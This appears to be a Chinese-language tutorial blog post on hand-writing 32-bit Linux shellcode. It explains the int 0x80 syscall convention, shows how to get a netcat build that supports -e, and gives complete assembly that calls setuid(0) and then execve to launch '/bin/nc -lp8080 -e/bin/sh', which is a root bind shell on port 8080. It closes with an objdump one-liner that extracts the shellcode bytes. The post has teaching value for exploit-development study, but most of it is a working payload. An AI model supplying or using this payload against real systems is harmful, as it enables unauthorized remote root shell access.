## 简介

和Windows版shellcode不同，linux不需要查找teb和peb啥的，直接调用系统中断就可以，因此篇幅要短很多，难度也降低一丢丢。

 解决nc的坑  有些nc是没有-e选项的，运行-e选项会有如下提示：

![](../Images/92e26f520ba217fa48b5426c72632961.png)

运行 `ls-ln/bin/nc`为

![](../Images/a0859ddcdb264ec70b547e82c277ec7e.png)

运行 `ls-ln/etc/alternatives/nc`

![](../Images/c57adf5e2a510611c998469ce4c339f8.png)

解决方案：  

1.  `sudo aptitude install netcat-traditional`
    
2.  `sudo update-alternatives--config nc`输入选择traditonal
    

![](../Images/c707c26a295880a18192ed92eceba3bd.png)

然后就可以直接调用-e选项的nc了。

## 系统调用

### syscall

我们通过syscall调用系统API来执行系统命令即syscall。通过man syscall来查找调用方案，可以得到

![](../Images/8e3b08db1406ed4fd487e020c4da637d.png)

![](../Images/ef5abacba079239d9f13979a3e4ea456.png)

1.  调用syscall的方法为 `int0x80`
    
2.  系统api存储寄存器为eax
    
3.  返回值存储寄存器为eax
    
4.  如果存在第二个返回值，返回值存储寄存器为edx。
    
5.  调用参数保存寄存器依次为ebx，ecx，edx，esi，edi，ebp。
    

### execve

系统调用的头文件在我使用的平台上为 `/usr/include/asm/unistd.h` ,打开查看其中的内容

```
1.  `/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */`
    
2.  `#ifndef _ASM_X86_UNISTD_H`
    
3.  `#define _ASM_X86_UNISTD_H`
    
4.  
    
5.  `#define __X32_SYSCALL_BIT    0x40000000`
    
6.  
    
7.  `# ifdef __i386__`
    
8.  `#  include <asm/unistd_32.h>`
    
9.  `# elif defined(__ILP32__)`
    
10.  `#  include <asm/unistd_x32.h>`
     
11.  `# else`
     
12.  `#  include <asm/unistd_64.h>`
     
13.  `# endif`
     
14.  
     
15.  `#endif /* _ASM_X86_UNISTD_H */`
     
```

我们需要编译32位shellcode，因此需要去unistd\_32.h中找。因为我们的目的是调用shell，所以需要用到的为 `__NR_execve`系统调用，通过在头文件中找到 `#define__NR_execve11`，因此系统调用号为11。`execve`的作用为在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序。我们通过 `man execve`获得该api调用方法为 `intexecve(constchar*pathname,char*constargv[],char*constenvp[]);`。其中:

1.  pathname 为我们要执行的命令的路径+文件名，是字符串这里为 `/bin/nc`。
    
2.  argv是要执行命令的参数的列表，是指针,这里为 `['/bin/nc','-lp8080','-e/bin/sh']`。
    
3.  envp为环境变量的列表，同样是指针，这里为null。同样的方法，找到setuid的调用号为23，即0x17
    

### 贴代码

下面贴代码

```
1.  `section .text  ; 定义代码段`
    
2.  
    
3.  `global _start`
    
4.  
    
5.  `_start:             ; 入口点 `
    
6.  `  xor ebx, ebx      ; 将0保存在ebx中`
    
7.  `  push byte 0x17`
    
8.  `  pop eax           ; 将setuid的调用号保存入eax`
    
9.  `  int 0x80          ; 调用setuid(0)`
    
10.  
     
11.  `  xor edx, edx      ; edx清零`
     
12.  
     
13.  `  push edx          ; 将字符串结尾的null压栈`
     
14.  `  push 0x636e2f2f   ; cn//压栈`
     
15.  `  push 0x6e69622f   ; nib/压栈`
     
16.  `  mov ebx, esp      ; 将字符串 '/bin//nc' 的首字节，即该字符指针存入ebx中。`
     
17.  
     
18.  `  push edx          ; 将字符串结尾的null压栈`
     
19.  `  push byte 0x30    ; 0`
     
20.  `  push word 0x3830  ; 80`
     
21.  `  push 0x38706c2d   ; 8pl-`
     
22.  `  mov eax, esp      ; 将字符串 '-lp8080' 的指针保存至eax`
     
23.  
     
24.  `  push edx          ; `
     
25.  `  push byte 0x68    ; h`
     
26.  `  push 0x732f6e69   ; s/ni`
     
27.  `  push 0x622f652d   ; b/e-`
     
28.  `  mov ecx, esp      ; 将字符串 '-e/bin/sh' 的指针保存至ecx`
     
29.  
     
30.  `  push edx          ; `
     
31.  `  push ecx          ; 字符串 '-e/bin/sh'指针压栈`
     
32.  `  push eax          ; 字符串 '-lp8080'指针压栈`
     
33.  `  push ebx          ; 字符串 '/bin//nc'指针压栈`
     
34.  `  mov ecx, esp      ; 参数列表指针存入ecx中。`
     
35.  
     
36.  `  push 0xb  ; execve调用号11压栈`
     
37.  `  pop eax   ; 将execve调用号11 存入eax中`
     
38.  `  int 0x80  ; 调用execve`
     
```

### 扣shellcode

```
1.  ``for i in `objdump -d b | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done``
    
```
